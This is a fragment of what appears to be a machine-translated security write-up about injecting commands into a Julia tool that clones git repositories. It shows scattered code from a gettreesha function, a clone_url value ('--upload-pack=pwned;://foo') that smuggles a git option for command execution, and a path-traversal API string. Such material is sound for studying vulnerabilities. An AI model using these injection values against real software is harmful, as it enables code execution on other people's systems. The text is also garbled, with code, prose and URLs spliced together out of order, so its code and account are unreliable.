...
slug: hack-source-source_translate
snapshot: ""
title_english: ""
translation_file: ""
translation_of: hack-source-source.md
---

# Hack the Source, Of the Source (English translation)
...
_Machine translation of [`hack-source-source.md`](hack-source-source.md), which holds the source's own words. Code, payloads, type names, URLs and CVE identifiers were masked before translating and restored after, so they are byte-identical to the original._
...
Controllable
               ...
               readchomp(`git -C $dest rev-parse $ref:$subdir`), ""
   {
     ...
     "clone_url":"--upload-pack=pwned;://foo",
          ...
          function gettreesha(repo, ref, subdir)
             return try
                 url = cloneurl(repo)     What path should we traverse to? 🤔
                 mktempdir() do dir
api.github.com/repos/../whatever\endpoint
                 dest = joinpath(dir, repo)
                     withpasswd(url) do url, env
